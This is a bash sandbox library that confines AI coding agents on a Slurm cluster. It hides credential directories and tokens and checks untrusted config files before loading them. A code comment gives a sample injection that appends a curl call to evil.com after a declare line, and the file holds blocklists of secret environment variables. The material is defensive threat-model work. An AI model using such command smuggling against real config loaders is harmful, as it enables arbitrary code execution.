#! /bin/bash --
# sandbox-lib.sh — Core sandbox library (backend-agnostic)
#
# Sourced by sandbox-exec.sh, sbatch-sandbox.sh, srun-sandbox.sh.
# Reads configuration from sandbox.conf, detects the best available backend,
# and provides:
#
#   detect_backend            — sets SANDBOX_BACKEND (bwrap, firejail, or landlock)
#   validate_project_dir DIR  — checks DIR is allowed
#   backend_available         — can this backend work?
#   backend_prepare DIR       — set up the sandbox for DIR
#   backend_exec CMD...       — run CMD inside the sandbox (execs)
#   backend_dry_run CMD...    — print what would be run

set -euo pipefail

# Require bash >= 4.4 for safe empty-array expansion under set -u.
# (In bash < 4.4, "${empty_array[@]}" is an unbound variable error.)
if [[ "${BASH_VERSINFO[0]}" -lt 4 ]] || { [[ "${BASH_VERSINFO[0]}" -eq 4 && "${BASH_VERSINFO[1]}" -lt 4 ]]; }; then
    echo "Error: sandbox-lib.sh requires bash >= 4.4 (found ${BASH_VERSION})." >&2
    exit 1
fi

SANDBOX_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"

# Build list of Slurm binaries to block inside the sandbox.
# Derived from chaperon/stubs/ — any executable file whose name does NOT
# start with "_" is treated as a command to block in /usr/bin.
# This also includes common Slurm binaries that we block even without stubs.
# All Slurm communication goes through the chaperon (outside the sandbox).
_build_chaperon_blocked_binaries() {
    CHAPERON_BLOCKED_BINARIES=()
    local stubs_dir="$SANDBOX_DIR/chaperon/stubs"
    if [[ -d "$stubs_dir" ]]; then
        for stub in "$stubs_dir"/*; do
            [[ -x "$stub" ]] || continue
            local name
            name="$(basename "$stub")"
            [[ "$name" == _* ]] && continue
            CHAPERON_BLOCKED_BINARIES+=("$name")
        done
    fi
    # salloc and sattach now have proper stubs and are picked up automatically above.
}

# Resolve HOME from the password database, not the environment variable.
# An agent (or user config) could export HOME=/tmp/evil before the sandbox
# starts, redirecting all home-relative paths.  getent passwd is authoritative.
HOME="$(getent passwd "$(id -un)" 2>/dev/null | cut -d: -f6)" || true
if [[ -z "$HOME" ]]; then
    # Fallback: the ~ expansion uses the passwd entry, not $HOME.
    HOME="$(cd ~ && pwd)"
fi
export HOME

# User data directory — user-owned config, temp data.
# Separate from SANDBOX_DIR (script location) so that an admin-owned install
# at e.g. /app/lib/agent-sandbox/ can coexist with per-user customization.
# Agent-specific paths (e.g., .claude, .codex, .gemini) are managed by
# agent profiles in agents/<name>/.
_USER_DATA_DIR="${HOME}/.config/agent-sandbox"
mkdir -p "$_USER_DATA_DIR"

SANDBOX_CONF="${SANDBOX_CONF:-$_USER_DATA_DIR/sandbox.conf}"

# ── Defaults (overridden by sandbox.conf) ───────────────────────

ALLOWED_PROJECT_PARENTS=("/fh/fast" "/fh/scratch" "$HOME")

READONLY_MOUNTS=(
    "/usr" "/lib" "/lib64" "/bin" "/sbin" "/etc"
    "/app"
)

HOME_READONLY=(
    ".bashrc" ".bash_profile" ".profile"
    ".zshrc" ".zprofile"
    ".inputrc"
    ".gitconfig"
    ".vimrc" ".vim"
    ".tmux.conf"
    ".dircolors"
    ".pythonrc"
    ".linuxbrew"
    ".local/bin"
    ".local/share/jupyter"
    "micromamba"
    ".condarc"
    ".mambarc"
    # Agent-specific paths are added automatically by agent profiles.
)

HOME_WRITABLE=(
    ".cache/uv"
    # Agent-specific paths (e.g., .claude, .codex, .gemini) are added
    # automatically by agent profiles in agents/<name>/home.conf.
)

# Home access mode:
#   restricted — (default) tmpfs HOME, selective mounts, read-only base
#   tmpwrite   — like restricted but tmpfs is writable (ephemeral writes, lost on exit)
#   read       — full real HOME readable; .ssh/.aws/.gnupg still hidden
#   write      — full real HOME writable; .ssh/.aws/.gnupg still hidden
# Can override via env: HOME_ACCESS=read sandbox-exec.sh -- bash
HOME_ACCESS="restricted"

# Credential dirs that are ALWAYS hidden regardless of HOME_ACCESS mode.
# In restricted mode these are hidden implicitly (never listed in HOME_READONLY).
# In read/write modes they are explicitly blocked (tmpfs/blacklist).
_HOME_ALWAYS_BLOCKED=(".ssh" ".aws" ".gnupg")

BLOCKED_FILES=()

EXTRA_BLOCKED_PATHS=()

EXTRA_WRITABLE_PATHS=()

# Admin deny-list: paths that must NEVER be writable, regardless of
# user config. EXTRA_WRITABLE_PATHS entries matching these (or under
# them) are stripped with a warning. Admins set this in the admin sandbox.conf.
DENIED_WRITABLE_PATHS=()

# Path to the Slurm sandbox bypass token (see ADMIN_HARDENING.md §1).
# When set, the bwrap backend automatically hides this file from the sandbox
# (overlays it with /dev/null). For the Landlock backend, use the eBPF LSM
# program instead (see slurm-enforce/token_protect.bpf.c).
# Can be set as SANDBOX_BYPASS_TOKEN or TOKEN_FILE (the Slurm wrapper name).

# Isolate /tmp with a private tmpfs (bwrap and firejail backends).
# Default: true. Set to false if the sandboxed process needs shared /tmp
# access (e.g., MPI shared-memory transport between ranks on the same node,
# or NCCL inter-GPU communication via /tmp sockets).
PRIVATE_TMP=true

# Filter /etc/passwd inside the sandbox to prevent LDAP/AD user enumeration.
# When true, generates a minimal /etc/passwd (system UIDs < 1000 + current
# user) and overrides nsswitch.conf to use "files" only (no ldap/sss).
# bwrap: overlays /etc/passwd + /etc/nsswitch.conf via --ro-bind.
# firejail: blocks NSS daemon sockets (nscd, nslcd, sssd).
# landlock: not supported (no mount namespace).
FILTER_PASSWD=true

# Bind host /dev into the sandbox instead of bwrap's minimal devtmpfs.
# Required for tmux (pty allocation) on kernels < 5.4. Exposes host
# /dev/pts — on kernels < 6.2 a same-user process could use TIOCSTI
# to inject keystrokes into unsandboxed terminals. See sandbox.conf.
BIND_DEV_PTS=false

# Backend selection. Empty means auto-detect (bwrap > firejail > landlock).
# Can be overridden by --backend flag, SANDBOX_BACKEND env, or config file.
# Preserve any value from env/CLI before setting the default — the override
# is restored after config loading (see _SANDBOX_BACKEND_OVERRIDE below).
SANDBOX_BACKEND="${SANDBOX_BACKEND:-}"

# Path to the Slurm bypass token file. bwrap/firejail hide it inside
# the sandbox. Can be set as SANDBOX_BYPASS_TOKEN or TOKEN_FILE (the
# Slurm wrapper name).
SANDBOX_BYPASS_TOKEN=""

BLOCKED_ENV_VARS=(
    "GITHUB_PAT" "GITHUB_TOKEN" "GH_TOKEN"
    "OPENAI_API_KEY" "ANTHROPIC_API_KEY"
    "ZENODO_TOKEN" "HF_TOKEN"
    "AWS_ACCESS_KEY_ID" "AWS_SECRET_ACCESS_KEY" "AWS_SESSION_TOKEN"
    "ST_AUTH" "SW2_URL"
    "MUTT_EMAIL_ADDRESS" "MUTT_REALNAME" "MUTT_SMTP_URL"
    "KRB5CCNAME" "SSH_CLIENT" "SSH_CONNECTION" "SSH_TTY"
    "SLURM_CONF" "SLURM_CONFIG_DIR"
    "DBUS_SESSION_BUS_ADDRESS" "OLDPWD"
    "TMUX" "TMUX_PANE"
)

# Allowed env vars: overrides BLOCKED_ENV_VARS and the SSH_* catch-all
ALLOWED_ENV_VARS=()

# ── Helper: check if an env var is in ALLOWED_ENV_VARS ────────
# Used by backends to skip blocking for explicitly allowed vars.
_is_allowed_env() {
    local _var="$1"
    for _a in "${ALLOWED_ENV_VARS[@]}"; do
        [[ "$_var" == "$_a" ]] && return 0
    done
    return 1
}

# ── Helpers: boolean normalization ─────────────────────────────
# Accept true/True/TRUE/yes/1 as truthy; everything else is false.
# Used for all boolean config values to prevent silent misconfiguration.
_is_true() {
    case "${1,,}" in  # bash 4+ lowercase
        true|yes|1) return 0 ;;
        *) return 1 ;;
    esac
}

# ── Multi-level config loading ──────────────────────────────────
#
# Config hierarchy (each layer adds to the previous):
#   1. Defaults (above)
#   2. Admin config (/app/lib/agent-sandbox/sandbox.conf) — security baseline
#   3. User config ($_USER_DATA_DIR/user.conf) — additive customization
#   4. Per-project overrides ($_USER_DATA_DIR/conf.d/*.conf)
#
# When an admin config exists at the hardcoded path, it is loaded first
# as a security baseline. The user's config ($_USER_DATA_DIR/user.conf)
# can add entries to security-critical arrays (BLOCKED_FILES,
# BLOCKED_ENV_VARS, EXTRA_BLOCKED_PATHS) but not remove admin-set
# ones. Items in the admin's HOME_READONLY cannot be moved to
# HOME_WRITABLE. The admin path is hardcoded (not an env var) to
# prevent an agent from redirecting it to a controlled directory.
#
# Without an admin config, $_USER_DATA_DIR/sandbox.conf is the only config.
# See ADMIN_INSTALL.md for setup instructions.

# Preserve any SANDBOX_BACKEND set via environment or --backend flag
# so config files cannot override an explicit backend selection.
_SANDBOX_BACKEND_OVERRIDE="${SANDBOX_BACKEND:-}"

# --- Determine config files ---
# Admin config path — set as a script variable, not from environment.
# An env var would let an agent redirect to an attacker-controlled dir.
# Change this line if the admin sandbox is installed elsewhere.
_ADMIN_CONF=""
_USER_CONF=""
_ADMIN_DIR="/app/lib/agent-sandbox"

if [[ "${SANDBOX_CONF:-}" != "" && "$SANDBOX_CONF" != "$_USER_DATA_DIR/sandbox.conf" ]]; then
    # Explicit SANDBOX_CONF override — single config, backward compat
    _USER_CONF="$SANDBOX_CONF"
elif [[ -f "$_ADMIN_DIR/sandbox.conf" ]]; then
    # Admin-installed: admin config is authoritative, user gets user.conf
    _ADMIN_CONF="$_ADMIN_DIR/sandbox.conf"
    if [[ -f "$_USER_DATA_DIR/user.conf" ]]; then
        _USER_CONF="$_USER_DATA_DIR/user.conf"
    elif [[ -f "$_USER_DATA_DIR/sandbox.conf" ]]; then
        # Fallback: accept sandbox.conf as user config (common when users
        # have customized sandbox.conf before admin install was deployed).
        _USER_CONF="$_USER_DATA_DIR/sandbox.conf"
    else
        _USER_CONF="$_USER_DATA_DIR/user.conf"  # Expected path (will be missing)
    fi
else
    # User-only install: single config
    _USER_CONF="$_USER_DATA_DIR/sandbox.conf"
fi

# --- Config variable names (single source of truth) ---
# Arrays and scalars that config files can set. Used by _load_untrusted_config
# to serialize/deserialize state and by _enforce_admin_policy to merge.
_CONFIG_ARRAYS=(
    ALLOWED_PROJECT_PARENTS READONLY_MOUNTS HOME_READONLY HOME_WRITABLE
    BLOCKED_FILES BLOCKED_ENV_VARS ALLOWED_ENV_VARS EXTRA_BLOCKED_PATHS
    EXTRA_WRITABLE_PATHS DENIED_WRITABLE_PATHS
)
_CONFIG_SCALARS=(
    SANDBOX_BACKEND PRIVATE_TMP FILTER_PASSWD BIND_DEV_PTS
    SLURM_SCOPE HOME_ACCESS
)
# Enforced arrays: user cannot remove admin-set entries (only add).
_ENFORCED_ARRAYS=(BLOCKED_FILES BLOCKED_ENV_VARS EXTRA_BLOCKED_PATHS)
# Token paths are admin-only — set in the admin config (sourced directly),
# never extracted from user configs.  Keeping them out of _CONFIG_SCALARS
# prevents users from overriding them and avoids declare -p failures when
# TOKEN_FILE has no default.

# --- Load an untrusted config file in an isolated subprocess ---
#
# Runs the config in a child bash process — no side effects in the parent.
# Serializes current state into the child, sources the config, then extracts
# only the known config variables via declare -p.
#
# This eliminates entire attack classes: DEBUG traps, exit/return, IFS
# manipulation, background processes, eval overrides — none can escape
# the subprocess boundary.
#
# The child's declare -p output is UNTRUSTED (the config could override
# `declare` as a function) and undergoes three-layer validation before
# being eval'd in the parent:
#   1. Prefix check: every line must start with 'declare '.
#   2. Name whitelist: the variable name must be in the allowed set.
#   3. Round-trip: eval the output in a clean subprocess and re-serialize
#      with the real declare -p — any injected payload causes a mismatch.
_load_untrusted_config() {
    local _conf="$1"
    local _label="${2:-Config}"

    if [[ ! -f "$_conf" ]]; then
        return 0
    fi

    # Syntax check (usability, not security — the subprocess handles safety)
    if ! bash -n "$_conf" 2>/dev/null; then
        echo "Error: Syntax error in $_conf" >&2
        bash -n "$_conf" >&2
        exit 1
    fi

    # Warn about unknown variable assignments (static check — no eval).
    # Catches stale config from older versions without runtime side effects.
    local _known_vars=" $(printf '%s ' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}") "
    local _unknown_var _unknown_list=()
    while IFS= read -r _unknown_var; do
        [[ -n "$_unknown_var" ]] || continue
        [[ "$_known_vars" == *" $_unknown_var "* ]] || _unknown_list+=("$_unknown_var")
    done < <(grep -oE '^[A-Z_][A-Z_0-9]*\+?=' "$_conf" | sed 's/+\?=$//' | sort -u)
    if [[ ${#_unknown_list[@]} -gt 0 ]]; then
        echo "sandbox: WARNING: ${_label} ($(basename "$_conf")) sets ${#_unknown_list[@]} unknown variable(s): ${_unknown_list[*]}" >&2
        echo "  These variables are ignored. They may be from an older version — re-run install.sh to update." >&2
    fi

    # Serialize current state for the subprocess
    local _parent_state
    _parent_state="$(declare -p "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}" 2>/dev/null || true)"

    # Run config in isolated subprocess, extract only known variables.
    # The subprocess inherits nothing except the serialized state.
    #
    # SECURITY: After `. "$2"` runs untrusted code, any bash builtin name
    # (declare, builtin, unset, command) could have been overridden as a
    # shell function.  Calling `declare -p` would execute the attacker's
    # function, whose output could pass a naive `^declare ` prefix check
    # while injecting arbitrary commands into the eval in the parent.
    #
    # You cannot prevent function overrides inside the subprocess — even
    # `builtin` itself can be overridden.  Therefore, the subprocess output
    # is treated as UNTRUSTED, and the parent applies strict validation
    # (see "Defence layers" below) before eval'ing it.
    local _var_names
    _var_names="$(printf '%s ' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"

    local _result _exit_code=0
    _result="$( /bin/bash --norc --noprofile -c '
        # Seed with parent state
        eval "$1"
        # Source the untrusted config
        . "$2" 2>/dev/null
        # Extract config variables.  If the config overrode declare as a
        # function, this calls the attacker'\''s code — but the parent
        # validates the output before eval'\''ing it (see below).
        declare -p '"$_var_names"' 2>/dev/null
    ' -- "$_parent_state" "$_conf" )" || _exit_code=$?

    if [[ $_exit_code -ne 0 ]]; then
        echo "WARNING: ${_label} exited with code ${_exit_code} — using values it set before exiting." >&2
    fi

    # --- Strict validation of subprocess output ---
    #
    # The subprocess output is UNTRUSTED because user config can override
    # `declare` (and even `builtin`) as shell functions.  A malicious
    # declare function could emit lines like:
    #   declare -g -- SANDBOX_BACKEND="bwrap"; curl http://evil.com #"
    # which starts with 'declare ' and would pass a prefix-only check.
    #
    # Defence layer 1: every line must start with 'declare '.
    # Defence layer 2: variable name whitelist — each line's variable name
    #   must be in _CONFIG_ARRAYS or _CONFIG_SCALARS.
    # Defence layer 3: structural validation — each line must match the
    #   EXACT format that real `declare -p` produces, with no trailing
    #   content after the value.  We parse line-by-line in the parent
    #   (which has clean builtins) and reject anything that doesn't
    #   round-trip cleanly through declare -p.
    if [[ -n "$_result" ]]; then
        # Layer 1: prefix check (fast reject of obvious garbage).
        local _bad_lines
        _bad_lines="$(echo "$_result" | grep -cvE '^declare ' || true)"
        if [[ "$_bad_lines" -gt 0 ]]; then
            echo "FATAL: ${_label} produced unexpected output — refusing to load." >&2
            echo "  File: $_conf" >&2
            return 1
        fi

        # Layer 2: variable name whitelist.
        # Build alternation of allowed names.
        local _allowed_re
        _allowed_re="$(printf '%s|' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"
        _allowed_re="${_allowed_re%|}"  # strip trailing |

        # Real declare -p output forms (bash 4.4+):
        #   declare -- VAR="value"
        #   declare -a VAR=([0]="v1" [1]="v2")
        #   declare -A VAR=([k]="v")
        #   declare -x VAR="value"
        #   declare -ar VAR=([0]="v1")
        # The flags field is a single group of letters after '-'.
        # '--' appears for untyped variables.
        local _name_bad
        _name_bad="$(echo "$_result" | grep -cvE "^declare (-[aAxir-]+ )*(-- )?($_allowed_re)=" || true)"
        if [[ "$_name_bad" -gt 0 ]]; then
            echo "FATAL: ${_label} declared unexpected variable names — refusing to load." >&2
            echo "  File: $_conf" >&2
            return 1
        fi

        # Layer 3: round-trip validation.
        # Eval each line in a CLEAN subprocess, then re-serialize with the
        # real declare -p.  If the re-serialized output differs from the
        # input, the line contained injected content (e.g., embedded
        # commands after the value that execute during eval but don't
        # appear in the re-serialized form).
        #
        # This is the strongest defence: even if an attacker crafts a line
        # that passes the prefix and name checks, any side-effect payload
        # (command substitution, ;-separated commands, etc.) will execute
        # in this isolated validation subprocess (not the parent) and will
        # NOT appear in the re-serialized output, causing a mismatch.
        local _roundtrip
        _roundtrip="$( /bin/bash --norc --noprofile -c '
            eval "$1"
            declare -p '"$_var_names"' 2>/dev/null
        ' -- "$_result" )" || true

        if [[ "$_roundtrip" != "$_result" ]]; then
            echo "FATAL: ${_label} output failed round-trip validation — refusing to load." >&2
            echo "  File: $_conf" >&2
            return 1
        fi

        # Apply extracted values to GLOBAL scope.
        # declare -p output produces 'declare -a VAR=(...)' for arrays and
        # 'declare -- VAR="..."' for scalars. Plain 'declare' inside a function
        # creates LOCAL variables, so the changes would never reach global scope.
        # Fix: add -g flag to make declarations global.
        _result="$(echo "$_result" | sed \
            -e 's/^declare -a /declare -ga /' \
            -e 's/^declare -A /declare -gA /' \
            -e 's/^declare -- /declare -g -- /' \
            -e 's/^declare -x /declare -gx /')"
        eval "$_result"
    fi
}

# --- Enforce admin policy: compare extracted values against admin snapshot ---
#
# After loading untrusted config (user.conf or conf.d), this function:
# 1. Warns about removed admin entries or overridden scalars
# 2. Restores admin values as the base
# 3. Merges user additions on top
# 4. Strips DENIED_WRITABLE_PATHS violations
#
# This is a pure comparison — no re-sourcing, no eval of untrusted code.
_enforce_admin_policy() {
    local _label="${1:-Config}"

    # --- Warn about violations ---
    local _a _item _found _aro

    # Enforced arrays: warn about removed admin entries
    for _a in "${_ADMIN_BLOCKED_FILES[@]}"; do
        _found=false
        for _item in "${BLOCKED_FILES[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced BLOCKED_FILES entry '${_a}' — restored." >&2
    done
    for _a in "${_ADMIN_BLOCKED_ENV_VARS[@]}"; do
        _found=false
        for _item in "${BLOCKED_ENV_VARS[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced BLOCKED_ENV_VARS entry '${_a}' — restored." >&2
    done
    for _a in "${_ADMIN_EXTRA_BLOCKED_PATHS[@]}"; do
        _found=false
        for _item in "${EXTRA_BLOCKED_PATHS[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced EXTRA_BLOCKED_PATHS entry '${_a}' — restored." >&2
    done

    # HOME_READONLY → HOME_WRITABLE escalation
    for _aro in "${_ADMIN_HOME_READONLY[@]}"; do
        for _item in "${HOME_WRITABLE[@]}"; do
            [[ "$_item" == "$_aro" ]] && echo "WARNING: ${_label} moved admin HOME_READONLY entry '${_aro}' to HOME_WRITABLE — reverted." >&2
        done
    done

    # --- Collect user-only additions (items not in admin snapshot) ---
    # Save the user's arrays before restoring admin values.
    local _user_bf=("${BLOCKED_FILES[@]}")
    local _user_bev=("${BLOCKED_ENV_VARS[@]}")
    local _user_aev=("${ALLOWED_ENV_VARS[@]}")
    local _user_ebp=("${EXTRA_BLOCKED_PATHS[@]}")
    local _user_hw=("${HOME_WRITABLE[@]}")
    local _user_ewp=("${EXTRA_WRITABLE_PATHS[@]}")
    local _user_rom=("${READONLY_MOUNTS[@]}")
    local _user_hro=("${HOME_READONLY[@]}")
    local _user_app=("${ALLOWED_PROJECT_PARENTS[@]}")

    # --- Restore admin base values ---
    BLOCKED_FILES=("${_ADMIN_BLOCKED_FILES[@]}")
    BLOCKED_ENV_VARS=("${_ADMIN_BLOCKED_ENV_VARS[@]}")
    ALLOWED_ENV_VARS=("${_ADMIN_ALLOWED_ENV_VARS[@]}")
    EXTRA_BLOCKED_PATHS=("${_ADMIN_EXTRA_BLOCKED_PATHS[@]}")
    HOME_READONLY=("${_ADMIN_HOME_READONLY[@]}")
    EXTRA_WRITABLE_PATHS=("${_ADMIN_EXTRA_WRITABLE_PATHS[@]}")
    READONLY_MOUNTS=("${_ADMIN_READONLY_MOUNTS[@]}")
    ALLOWED_PROJECT_PARENTS=("${_ADMIN_ALLOWED_PROJECT_PARENTS[@]}")
    HOME_WRITABLE=("${_ADMIN_HOME_WRITABLE[@]}")
    DENIED_WRITABLE_PATHS=("${_ADMIN_DENIED_WRITABLE_PATHS[@]}")
    SANDBOX_BYPASS_TOKEN="$_ADMIN_SANDBOX_BYPASS_TOKEN"
    TOKEN_FILE="$_ADMIN_TOKEN_FILE"

    # --- Merge: admin base + user-only additions ---
    local _in_admin
    local _saved_ref _admin_ref
    # Helper: append items from user array that aren't in admin array
    _merge_additions() {
        local -n _user_arr=$1 _admin_arr=$2 _target_arr=$3
        for _item in "${_user_arr[@]}"; do
            _in_admin=false
            for _a in "${_admin_arr[@]}"; do
                [[ "$_item" == "$_a" ]] && { _in_admin=true; break; }
            done
            $_in_admin || _target_arr+=("$_item")
        done
    }
    _merge_additions _user_bf   _ADMIN_BLOCKED_FILES          BLOCKED_FILES
    _merge_additions _user_bev  _ADMIN_BLOCKED_ENV_VARS       BLOCKED_ENV_VARS
    _merge_additions _user_aev  _ADMIN_ALLOWED_ENV_VARS       ALLOWED_ENV_VARS
    _merge_additions _user_ebp  _ADMIN_EXTRA_BLOCKED_PATHS    EXTRA_BLOCKED_PATHS
    _merge_additions _user_ewp  _ADMIN_EXTRA_WRITABLE_PATHS   EXTRA_WRITABLE_PATHS
    _merge_additions _user_rom  _ADMIN_READONLY_MOUNTS        READONLY_MOUNTS
    _merge_additions _user_hro  _ADMIN_HOME_READONLY          HOME_READONLY
    _merge_additions _user_app  _ADMIN_ALLOWED_PROJECT_PARENTS ALLOWED_PROJECT_PARENTS

    # HOME_WRITABLE: merge user additions, but strip admin HOME_READONLY items
    for _item in "${_user_hw[@]}"; do
        _in_admin=false
        for _a in "${_ADMIN_HOME_WRITABLE[@]}"; do
            [[ "$_item" == "$_a" ]] && { _in_admin=true; break; }
        done
        if ! $_in_admin; then
            # Check it's not an admin HOME_READONLY escalation
            local _is_admin_ro=false
            for _aro in "${_ADMIN_HOME_READONLY[@]}"; do
                [[ "$_item" == "$_aro" ]] && { _is_admin_ro=true; break; }
            done
            $_is_admin_ro || HOME_WRITABLE+=("$_item")
        fi
    done

    # --- Enforce DENIED_WRITABLE_PATHS ---
    if [[ ${#DENIED_WRITABLE_PATHS[@]} -gt 0 ]]; then
        local _clean=() _denied _full_path

        # Check EXTRA_WRITABLE_PATHS
        for _item in "${EXTRA_WRITABLE_PATHS[@]}"; do
            _found=false
            for _denied in "${DENIED_WRITABLE_PATHS[@]}"; do
                _denied="${_denied/\$HOME/$HOME}"
                _denied="${_denied%/}"
                if [[ "$_item" == "$_denied" || "$_item" == "$_denied/"* ]]; then
                    echo "WARNING: ${_label} added EXTRA_WRITABLE_PATHS entry '${_item}' under denied path '${_denied}' — removed." >&2
                    _found=true; break
                fi
            done
            $_found || _clean+=("$_item")
        done
        EXTRA_WRITABLE_PATHS=("${_clean[@]}")

        # Check HOME_WRITABLE (entries are $HOME-relative)
        _clean=()
        for _item in "${HOME_WRITABLE[@]}"; do
            _full_path="$HOME/$_item"
            _found=false
            for _denied in "${DENIED_WRITABLE_PATHS[@]}"; do
                _denied="${_denied/\$HOME/$HOME}"
                _denied="${_denied%/}"
                if [[ "$_full_path" == "$_denied" || "$_full_path" == "$_denied/"* ]]; then
                    echo "WARNING: ${_label} added HOME_WRITABLE entry '${_item}' under denied path '${_denied}' — removed." >&2
                    _found=true; break
                fi
            done
            $_found || _clean+=("$_item")
        done
        HOME_WRITABLE=("${_clean[@]}")
    fi
}

# --- Source a trusted config file (admin-owned, no isolation needed) ---
_source_trusted_config() {
    local _conf="$1"
    if ! bash -n "$_conf" 2>/dev/null; then
        echo "Error: Syntax error in $_conf" >&2
        bash -n "$_conf" >&2
        exit 1
    fi
    # shellcheck disable=SC1090
    source "$_conf"
}

# --- Snapshot admin config values after loading ---
_snapshot_admin_config() {
    # Auto-discover token path before snapshotting, so the admin value
    # is captured and enforced through _enforce_admin_policy().
    if [[ -z "${SANDBOX_BYPASS_TOKEN:-}" && -n "${TOKEN_FILE:-}" ]]; then
        SANDBOX_BYPASS_TOKEN="$TOKEN_FILE"
    fi

    _ADMIN_BLOCKED_FILES=("${BLOCKED_FILES[@]}")
    _ADMIN_BLOCKED_ENV_VARS=("${BLOCKED_ENV_VARS[@]}")
    _ADMIN_ALLOWED_ENV_VARS=("${ALLOWED_ENV_VARS[@]}")
    _ADMIN_EXTRA_BLOCKED_PATHS=("${EXTRA_BLOCKED_PATHS[@]}")
    _ADMIN_HOME_READONLY=("${HOME_READONLY[@]}")
    _ADMIN_HOME_WRITABLE=("${HOME_WRITABLE[@]}")
    _ADMIN_DENIED_WRITABLE_PATHS=("${DENIED_WRITABLE_PATHS[@]}")
    _ADMIN_EXTRA_WRITABLE_PATHS=("${EXTRA_WRITABLE_PATHS[@]}")
    _ADMIN_READONLY_MOUNTS=("${READONLY_MOUNTS[@]}")
    _ADMIN_ALLOWED_PROJECT_PARENTS=("${ALLOWED_PROJECT_PARENTS[@]}")
    _ADMIN_SANDBOX_BYPASS_TOKEN="${SANDBOX_BYPASS_TOKEN:-}"
    _ADMIN_TOKEN_FILE="${TOKEN_FILE:-}"
}

# ── Phase 1: Source admin config (trusted — admin-owned, root-protected) ──
if [[ -n "$_ADMIN_CONF" && -f "$_ADMIN_CONF" ]]; then
    _source_trusted_config "$_ADMIN_CONF"
    _snapshot_admin_config
fi

# ── Phase 2: Load user config (untrusted — runs in isolated subprocess) ──
_load_untrusted_config "$_USER_CONF" "User config"

# ── Phase 3: Enforce admin policy ──
# Pure comparison + merge — no re-sourcing, no eval of untrusted code.
if [[ -n "$_ADMIN_CONF" ]]; then
    _enforce_admin_policy "User config"
fi

# Restore explicit backend override (env/CLI takes precedence over config)
if [[ -n "$_SANDBOX_BACKEND_OVERRIDE" ]]; then
    SANDBOX_BACKEND="$_SANDBOX_BACKEND_OVERRIDE"
fi
unset _SANDBOX_BACKEND_OVERRIDE

# ── Validate config ──────────────────────────────────────────────

# Reject command substitution or backticks in path arrays (defense in depth).
_validate_path_array() {
    local name="$1"; shift
    for item in "$@"; do
        if [[ "$item" =~ \$\( ]] || [[ "$item" =~ \` ]]; then
            echo "Error: Command substitution in $name: $item" >&2
            exit 1
        fi
    done
}

# ── Per-project config overrides ─────────────────────────────────
#
# Loads *.conf files from conf.d/ in an isolated subprocess (same as
# user.conf), then enforces admin policy. Each conf.d file can use
# _PROJECT_DIR to guard itself:
#   [[ "$_PROJECT_DIR" == /some/prefix/* ]] || return 0
#
# Called once from sandbox-exec.sh after PROJECT_DIR is resolved.

load_project_config() {
    local _PROJECT_DIR="$1"
    local _conf_d="$_USER_DATA_DIR/conf.d"

    if [[ -d "$_conf_d" ]]; then
        local _f
        for _f in "$_conf_d"/*.conf; do
            [[ -f "$_f" ]] || continue
            # Each conf.d file runs in its own subprocess with _PROJECT_DIR
            # available so it can guard on project path.
            _PROJECT_DIR="$_PROJECT_DIR" _load_untrusted_config "$_f" "Project config ($(basename "$_f"))"
        done
    fi

    # Re-enforce admin policy after all conf.d additions
    if [[ -n "${_ADMIN_CONF:-}" ]]; then
        _enforce_admin_policy "Project config"
    fi

    # Validate all path arrays
    _validate_path_array ALLOWED_PROJECT_PARENTS "${ALLOWED_PROJECT_PARENTS[@]}"
    _validate_path_array READONLY_MOUNTS "${READONLY_MOUNTS[@]}"
    _validate_path_array HOME_READONLY "${HOME_READONLY[@]}"
    _validate_path_array HOME_WRITABLE "${HOME_WRITABLE[@]}"
    _validate_path_array BLOCKED_FILES "${BLOCKED_FILES[@]}"
    _validate_path_array EXTRA_BLOCKED_PATHS "${EXTRA_BLOCKED_PATHS[@]}"
    _validate_path_array EXTRA_WRITABLE_PATHS "${EXTRA_WRITABLE_PATHS[@]}"
}

# Fail early if HOME is unset (many paths depend on it).
if [[ -z "${HOME:-}" ]]; then
    echo "Error: \$HOME is not set." >&2
    exit 1
fi

# Warn about critical READONLY_MOUNTS that are missing from config.
# Without these, the sandbox starts but almost nothing works inside it.
for _critical_mount in /usr /lib /bin /sbin /etc; do
    _found=false
    for _m in "${READONLY_MOUNTS[@]}"; do
        if [[ "$_m" == "$_critical_mount" ]]; then _found=true; break; fi
    done
    if ! $_found && [[ -d "$_critical_mount" ]]; then
        echo "WARNING: $_critical_mount is not in READONLY_MOUNTS. The sandbox may not function correctly." >&2
    fi
done

# Agent-specific HOME_WRITABLE entries are added automatically by
# _apply_agent_profiles(). No hardcoded critical-path warnings needed.

# Detect paths that appear in both HOME_READONLY and HOME_WRITABLE.
# The writable mount wins (later bwrap arg overrides), which may
# silently escalate permissions beyond what the user intended.
for _ro in "${HOME_READONLY[@]}"; do
    for _rw in "${HOME_WRITABLE[@]}"; do
        if [[ "$_ro" == "$_rw" ]]; then
            echo "WARNING: $HOME/$_ro is in both HOME_READONLY and HOME_WRITABLE (writable wins)." >&2
        fi
    done
done

# Warn when backend-specific features are used with an incompatible backend.
if [[ "${SANDBOX_BACKEND:-auto}" == "landlock" ]]; then
    if _is_true "${FILTER_PASSWD:-true}"; then
        echo "WARNING: FILTER_PASSWD=true has no effect with the Landlock backend (no mount namespace)." >&2
        echo "  User enumeration prevention requires bwrap or firejail." >&2
    fi
    if [[ ${#BLOCKED_FILES[@]} -gt 0 ]]; then
        echo "WARNING: BLOCKED_FILES has no effect with the Landlock backend." >&2
        echo "  Individual file blocking requires bwrap or firejail." >&2
    fi
fi
if [[ "${SANDBOX_BACKEND:-auto}" != "bwrap" && "${SANDBOX_BACKEND:-auto}" != "auto" ]]; then
    if _is_true "${BIND_DEV_PTS:-false}"; then
        echo "WARNING: BIND_DEV_PTS only applies to the bwrap backend." >&2
    fi
fi

# Auto-discover bypass token path.
# TOKEN_FILE is the Slurm wrapper name; SANDBOX_BYPASS_TOKEN is the sandbox name.
# The admin config may set either.
